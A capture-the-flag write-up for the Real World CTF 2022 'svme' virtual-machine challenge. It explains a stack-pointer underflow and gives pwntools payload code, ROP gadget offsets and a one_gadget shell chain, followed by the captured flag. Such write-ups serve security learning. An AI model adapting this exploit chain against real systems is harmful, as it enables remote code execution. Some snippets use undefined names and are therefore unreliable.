---
title: 'Secured Java - Real World CTF 2022'
permalink: /writeups/realworld2022/svme
---


> Professor Terence Parr has taught us how to build a virtual machine. Now it's time to break it!
> nc 47.243.140.252 1337

## Analysis

### Checksec

```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### File command output

ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=ac06c33f16248df7768fed3ecefb7e6a85ec5941, not stripped

So we have a 64 bits binary with all mitigations enabled that is also dynamically linked.

## Finding the vulnerability

```c
void vm_exec(VM *vm, int startip, bool trace)
{
    // registers
    int ip;         // instruction pointer register
    int sp;         // stack pointer register
    int callsp;     // call stack pointer register

    int a = 0;
    int b = 0;
    int addr = 0;
    int offset = 0;

    ip = startip;
    sp = -1;
    callsp = -1;
    int opcode = vm->code[ip];

    while (opcode != HALT && ip < vm->code_size) {
        if (trace) vm_print_instr(vm->code, ip);
        ip++; //jump to next instruction or to operand
        switch (opcode) {
            case IADD:
                b = vm->stack[sp--];           // 2nd opnd at top of stack
                a = vm->stack[sp--];           // 1st opnd 1 below top
                vm->stack[++sp] = a + b;       // push result
                break;
            case ISUB:
                b = vm->stack[sp--];
                a = vm->stack[sp--];
                vm->stack[++sp] = a - b;
                break;
            case IMUL:
                b = vm->stack[sp--];
                a = vm->stack[sp--];
                vm->stack[++sp] = a * b;
                break;
            case ILT:
                b = vm->stack[sp--];
                a = vm->stack[sp--];
                vm->stack[++sp] = (a < b) ? true : false;
                break;
            case IEQ:
                b = vm->stack[sp--];
                a = vm->stack[sp--];
                vm->stack[++sp] = (a == b) ? true : false;
                break;
            case BR:
                ip = vm->code[ip];
                break;
            case BRT:
                addr = vm->code[ip++];
                if (vm->stack[sp--] == true) ip = addr;
                break;
            case BRF:
                addr = vm->code[ip++];
                if (vm->stack[sp--] == false) ip = addr;
                break;
            case ICONST:
                vm->stack[++sp] = vm->code[ip++];  // push operand
                break;
            case LOAD: // load local or arg
                offset = vm->code[ip++];
                vm->stack[++sp] = vm->call_stack[callsp].locals[offset];
                break;
            case GLOAD: // load from global memory
                addr = vm->code[ip++];
                vm->stack[++sp] = vm->globals[addr];
                break;
            case STORE:
                offset = vm->code[ip++];
                vm->call_stack[callsp].locals[offset] = vm->stack[sp--];
                break;
            case GSTORE:
                addr = vm->code[ip++];
                vm->globals[addr] = vm->stack[sp--];
                break;
            case PRINT:
                printf("%d\n", vm->stack[sp--]);
                break;
            case POP:
                --sp;
                break;
            case CALL:
                // expects all args on stack
                addr = vm->code[ip++];// index of target function
                int nargs = vm->code[ip++];// how many args got pushed
                int nlocals = vm->code[ip++];// how many locals to allocate
                ++callsp; // bump stack pointer to reveal space for this call
                vm_context_init(&vm->call_stack[callsp], ip, nargs+nlocals);
                // copy args into new context
                for (int i=0; i<nargs; i++) {
                    vm->call_stack[callsp].locals[i] = vm->stack[sp-i];
                }
                sp -= nargs;
                ip = addr;// jump to function
                break;
            case RET:
                ip = vm->call_stack[callsp].returnip;
                callsp--; // pop context
                break;
            default:
                printf("invalid opcode: %d at ip=%d\n", opcode, (ip - 1));
                exit(1);
        }
        if (trace) vm_print_stack(vm->stack, sp);
        opcode = vm->code[ip];
    }
    if (trace) vm_print_data(vm->globals, vm->nglobals);
}
```

As we can see, no checks are made to the stack pointer variable. Meaning it can have negative values and write outside the stack buffer. But how does this help us at all?

```c
typedef struct {
    int *code;
    int code_size;

    // global variable space
    int *globals;
    int nglobals;

    // Operand stack, grows upwards
    int stack[DEFAULT_STACK_SIZE];
    Context call_stack[DEFAULT_CALL_STACK_SIZE];
} VM;
```

```python
0x0000563c30e812a0│+0x02a0: 0x00007ffd6af2c040  →  0x0000000c0000000f #code pointer
0x0000563c30e812a8│+0x02a8: 0x0000000000000080 # number of instructions (0x80 = 128)
0x0000563c30e812b0│+0x02b0: 0x0000563c30e833a0  →  0x0000000000000000 #globals pointer
0x0000563c30e812b8│+0x02b8: 0x0000000000000000 #stack
0x0000563c30e812c0│+0x02c0: 0x0000000000000000
0x0000563c30e812c8│+0x02c8: 0x0000000000000000
```

We know by analysing the vm.c that it allocates the vm on the heap as continous memory (since calloc is used for the allocation). By analysing the heap in the beginning of the program (as shown above), we can conclude that if the stack pointer takes the value of -1 it will be overwriting the globals pointer, giving us arbitrary write permissions. So if we set the globals pointer to, for instances, the return address of main, we can change code execution to wherever we want and we won't have to worry about the cannary.

## Exploit

### Initial notes

Given that the vm only receives input once, we will be using the vm's add function to calculate the offsets that I need in order to beat PIE.
We have to assume that ASLR is also enabled on the server, since we have no information indicating the otherwise. Also, I recomend checking the specific assembly that the vm works (you can find it in the files vm.c and vm.h, which are in the simple-virtual-machine-C-master directory), not only because it will make this exploit clearer, but also, because I relied a lot on that assembly to open my shell.

```c
void vm_init(VM *vm, int *code, int code_size, int nglobals)
{
    vm->code = code;
    vm->code_size = code_size;
    vm->globals = calloc(nglobals, sizeof(int));
    vm->nglobals = nglobals;
}


int main(int argc, char *argv[]) {
    int code[128], nread = 0;
    while (nread < sizeof(code)) {
        int ret = read(0, code+nread, sizeof(code)-nread);
        if (ret <= 0) break;
        nread += ret;
    }
    VM *vm = vm_create(code, nread/4, 0);
    vm_exec(vm, 0, true);
    vm_free(vm);
    return 0;
}
```

I'd also like to point out that the code pointer is , not only, a pointer to a stack stored buffer (as you can see above), but also, stored (in the heap) at a fixed offset from the vm's stack . Therefore, we can find the return address of main by setting the globals pointer to the same address as the code pointer, since it will always be stored on the stack at a fixed offset.

### Gadgets use

For this exploit I will rely on three gadgets:  
      &emsp;[1] pop rsp ; ret (will be used to pivot the stack)\
      &emsp;[2] xor r12d, r12d ; mov rax, r12 ; pop r12 ; ret (to meet one gadget constrains)\
      &emsp;[3] one gadget (one of the possible offsets)\
The usage of theese gadgets will be explained later.

### Assembly instructions used (vm's assembly)

I will only use the following assembly instructions:\
    &emsp;[1] ICONST value (= push value)\
    &emsp;[2] POP (=simply decrements the stack pointer)\
    &emsp;[3] GLOAD offset (loads globals[offset] to the stack,increments the stack pointer)\
    &emsp;[4] GSTORE offset (stores to globals[offset] the value on top of the stack,decrements the stack pointer)\
    &emsp;[5] LOAD offset (loads callstack[offset] to the stack,increments the stack pointer)\
    &emsp;[6] STORE offset (stores to callstack[offset] the value on top of the stack,decrements the stack pointer)\
    &emsp;[7] ADD (adds the first two values on the stack and places the result on top of the stack)\

### Actual exploit

```python
#just to interact with the binary
def vm_halt():
    return p32(18)

def vm_push(value):
    return p32(9) + p32(value)

def vm_pop(times=1):
    return p32(15)*times

def vm_gload(offset):
    return p32(11) + p32(offset)


#value is on the stack
def vm_gstore(offset):
    return p32(13) + p32(offset)

def vm_load(offset):
    return p32(10) + p32(offset)

def vm_store(offset):
    return p32(12) + p32(offset)

def vm_add():
    return p32(1)

IP_MOST_SIGNIFICANT = 0 
IP_LEAST_SIGNIFICANT = 1 
RET_MAIN_LEAST = 134 
ONE_GADGET_OFFSET=0xbfbcb 
FIRST_GADGET_OFFSET=0xbaa7 
GLOBALS_LEAST=5 
SECOND_GADGET_OFFSET=0xac13d 
RET_MAIN_LEAST_STORED=9 
RET_MAIN_MOST_STORED=10
```

I have defined some functions to help me send the correct instructions to the vm. Also, I defined some constants to help me with the offset handling.
It is worth mentioning, the the code buffer is a integer buffer and integers are 4 bytes (32 bits) long, hence I use the p32 function from pwntools.
We will start by moving the stack pointer to the code pointer, while storing the globals pointer to be reset later. After storing the code pointer in the callstack, we set the globals to point to the same place as code. This first part of the exploit is shown bellow.

```python
#stores the globals locally pointer to later reset it to its original value
# stores ip address value locally
payload += vm_pop() + vm_store(GLOBALS_MOST) + vm_store(GLOBALS_LEAST) + vm_pop(2)  + vm_store(IP_MOST_SIGNIFICANT) + vm_store(IP_LEAST_SIGNIFICANT)
# overwrites ip with the same address to keep it
payload += vm_load(IP_LEAST_SIGNIFICANT) + vm_load(IP_MOST_SIGNIFICANT) + vm_push(0x80) + vm_push(0)
# overwrites the globals pointer to be the same as the ip address
payload += vm_load(IP_LEAST_SIGNIFICANT) + vm_load(IP_MOST_SIGNIFICANT)
#stores main return value
payload += vm_gload(RET_MAIN_LEAST) + vm_store(RET_MAIN_LEAST_STORED) +vm_gload(RET_MAIN_LEAST+1) + vm_store(RET_MAIN_MOST_STORED)
```

I stored the main's return address locally just for convinence in the address calculation that will be done later.
Now, we will overwrite the least significant part of the main's return address with the gadget 1, to pivot the stack. To achieve this, we only need to call the vm's add function with both the least significant part of the main's return address and the gadget's offset (from the main's return address) placed on the stack. The overwrite is just a simple combination of loads and stores (both global and from the callstack).
I decided to pivot the stack to where code points, as it needed to be 16-bit aligned and code is. So, using a combination of loads and stores I wrote the address pointed by code next to the gadget's address (so pop rsp will pop this value).

```python
#changes main return address to pop rsp gadget (to get an aligned stack)
payload += vm_gload(RET_MAIN_LEAST) + vm_push(FIRST_GADGET_OFFSET) + vm_add() + vm_gstore(RET_MAIN_LEAST)
#pivots the stack
payload += vm_load(IP_LEAST_SIGNIFICANT) + vm_gstore(RET_MAIN_LEAST+2) + vm_load(IP_MOST_SIGNIFICANT) + vm_gstore(RET_MAIN_LEAST+3)
```

Now, I suggest that we take a look at the one gadget constrains (I chose this one, however another could have been chosen instead).

```bash
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
[r15] == NULL || r15 == NULL
[r12] == NULL || r12 == NULL
```

Using gdb I found out that r15 is always NULL, but r12 isn't. So I used the second gadget to make sure that r12 is NULL.

```python
#writes the address of the other gadget
payload += vm_load(RET_MAIN_MOST_STORED) + vm_gstore(1) + vm_load(RET_MAIN_LEAST_STORED) + vm_push(SECOND_GADGET_OFFSET)
payload += vm_add() + vm_gstore(0)
```

Using the same logic that I used to get the address for the first gadget, I calculated the address of the second gadget and set the stack to ensure that r12 ends up NULL in the end.
Finnaly, all that is left to do is write the address of one gadget to garantee that the ret from the second gadget returns to one gadget (to calculate the address I used, one last time, the same logic as for the other two gadgets).
Then, when we call halt (forcing main to return), we will have opened a shell.

```python
# writes the address of one_gadget
payload += vm_load(RET_MAIN_MOST_STORED) + vm_gstore(5) + vm_load(RET_MAIN_LEAST_STORED) + vm_push(ONE_GADGET_OFFSET) + vm_add() + vm_gstore(4)

#restores the globals pointer to ensure there are no problems in free
payload += vm_push(0) + vm_gstore(2) + vm_push(0) + vm_gstore(3) 
payload += vm_push(0)*2 + vm_pop(3) + vm_load(GLOBALS_MOST) + vm_pop(2) + vm_load(GLOBALS_LEAST)

#garantees the payload size (in bytes) is 512 
payload += (512-len(payload)//4)*vm_halt()
```

I restored the globals pointer just to make sure the free call doesn't fail. Also, the binary reads a payload of 512 bytes (=128*4byte), so the last line of my exploit ensures that the payload's lenght is 512 (adding as many halts as needed).

And finnaly we got out shell!!

```bash
[+] Opening connection to 47.243.140.252 on port 1337: Done
[*] Switching to interactive mode

rwctf{simple_vm_escape_helps_warming_up_your_real_world_hacking_skill}
```

## Final Notes

Overall, this was a fun challenged, as it ,not only, forced me to think in a different assembly language, but also, is an uncommon one.
I'd like to point out that this is just one approach, we could have chosen a different approach. For instances, instead of the main's return address we could have overwritten the free hook.
